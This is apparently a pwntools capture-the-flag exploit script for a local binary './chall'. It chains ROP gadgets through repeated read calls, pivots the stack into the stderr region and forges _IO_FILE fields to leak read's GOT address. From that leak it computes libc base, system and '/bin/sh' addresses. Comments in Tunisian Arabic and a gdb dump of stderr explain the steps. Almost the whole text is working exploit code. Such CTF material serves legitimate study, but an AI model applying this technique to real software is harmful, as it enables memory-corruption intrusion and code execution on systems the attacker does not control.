from pwn import *
from time import sleep
"""
_IO_2_1_stderr_ {
  file = {
    _flags = 0xfbad2087, 
    _IO_read_ptr = 0x7ffff7dd0703 <_IO_2_1_stderr_+131> "", 
    _IO_read_end = 0x7ffff7dd0703 <_IO_2_1_stderr_+131> "", 
    _IO_read_base = 0x7ffff7dd0703 <_IO_2_1_stderr_+131> "", 
    _IO_write_base = 0x7ffff7dd0703 <_IO_2_1_stderr_+131> "", 
    _IO_write_ptr = 0x7ffff7dd0703 <_IO_2_1_stderr_+131> "", 
    _IO_write_end = 0x7ffff7dd0703 <_IO_2_1_stderr_+131> "", 
    _IO_buf_base = 0x7ffff7dd0703 <_IO_2_1_stderr_+131> "", 
    _IO_buf_end = 0x7ffff7dd0704 <_IO_2_1_stderr_+132> "", 
    _IO_save_base = 0x0, 
    _IO_backup_base = 0x0, 
    _IO_save_end = 0x0, 
    _markers = 0x0, 
    _chain = 0x7ffff7dd0760 <_IO_2_1_stdout_>, 
    _fileno = 0x2, 
    _flags2 = 0x0, 
    _old_offset = 0xffffffffffffffff, 
    _cur_column = 0x0, 
    _vtable_offset = 0x0, 
    _shortbuf = "", 
    _lock = 0x7ffff7dd18b0 <_IO_stdfile_2_lock>, 
    _offset = 0xffffffffffffffff, 
    _codecvt = 0x0, 
    _wide_data = 0x7ffff7dcf780 <_IO_wide_data_2>, 
    _freeres_list = 0x0, 
    _freeres_buf = 0x0, 
    __pad5 = 0x0, 
    _mode = 0x0, 
    _unused2 = '\000' <repeats 19 times>
  }, 
  vtable = 0x7ffff7dcc2a0 <_IO_file_jumps>
}

"""
period=0.3
entry=0x400430
pop_rdi_ret=0x000000000040049c
pop_rsi_ret=0x000000000040049e
leave_ret=0x0000000000400499
ret=0x000000000040047d
pop_rbp_ret=0x000000000040047c
stderr_rela_dyn=0x0000000000601040
stdout_rela_dyn=0x0000000000601020
dec_ecx=0x0000000000400498
read_plt=0x400410
exit_plt=0x400420
main=0x40047e
read_got=0x600ff0
p=process("./chall")

payload=""
payload+="A"*40

payload+=p64(pop_rsi_ret)
payload+=p64(stderr_rela_dyn-8)
payload+=p64(read_plt) # A

payload+=p64(pop_rsi_ret)
payload+=p64(stderr_rela_dyn+8)
payload+=p64(read_plt) # B

payload+=p64(pop_rsi_ret)
payload+=p64(stderr_rela_dyn+2024)
payload+=p64(read_plt) # C

payload+=p64(pop_rsi_ret)
payload+=p64(stderr_rela_dyn+16)
payload+=p64(read_plt) # D

payload+=p64(pop_rsi_ret)
payload+=p64(stderr_rela_dyn+2088)
payload+=p64(read_plt) # E

payload+=p64(pop_rbp_ret)
payload+=p64(stderr_rela_dyn-16)
payload+=p64(leave_ret) # pivot to stderr - 8

"""
stderr-8:
	-pop rsi
	-libc stderr
	-read # F
	-pop rbp
	-stderr +1024
	-leave
	..
	..
	..    #ba3ed el exit bech el rsp mayouselch lel got w yal3ab feha w yjib segfault
	..
	-exit
"""
p.send(payload) # read te3 el main
sleep(period) # lazem sleep kenhedha tod5ol b3adh'ha f ordre el read


p.send(p64(pop_rsi_ret)) # jaweb A
sleep(period)

p.send(p64(read_plt)) # jaweb B 
sleep(period)

p.send(p64(exit_plt)) # jaweb C
sleep(period)

#gdb.attach(p.pid)
#pause()

payload=""
payload+=p64(pop_rbp_ret)
payload+=p64(stderr_rela_dyn+2024-8)
payload+=p64(leave_ret)
p.send(payload) #jaweb D
sleep(period)

payload=""
payload+=p64(0)
payload+=p64(0)
payload+=p64(0)
payload+=p64(0x4141414141414141)
p.send(payload) # jaweb E (fake vtable)
sleep(period)


payload=""
payload+=p64(0xfbad1800) #_flags : 0xfbad0000 IO_MAGIC  | 0x1800 el flags : output as fast as possible
payload+=p64(0) # _IO_read_ptr
payload+=p64(0) # _IO_read_end
payload+=p64(0) # _IO_read_base
payload+=p64(read_got) # _IO_write_base
payload+=p64(read_got+8) # _IO_write_ptr
payload+=p64(read_got+8) #_IO_write_end

print "vtable  :",hex(stderr_rela_dyn+2088)
#gdb.attach(p.pid)
pause()
p.send(payload) #jaweb F

leak=u64(p.recv())
base=leak-0x110070
system=leak+0x04f440
binsh=leak+0x1b3e9a
print "read :",hex(leak)
print "base :",hex(base)
print "system :",hex(system)
print "binsh :",hex(binsh)

#p.interactive()



#_IO_flush_all_lockp+506



















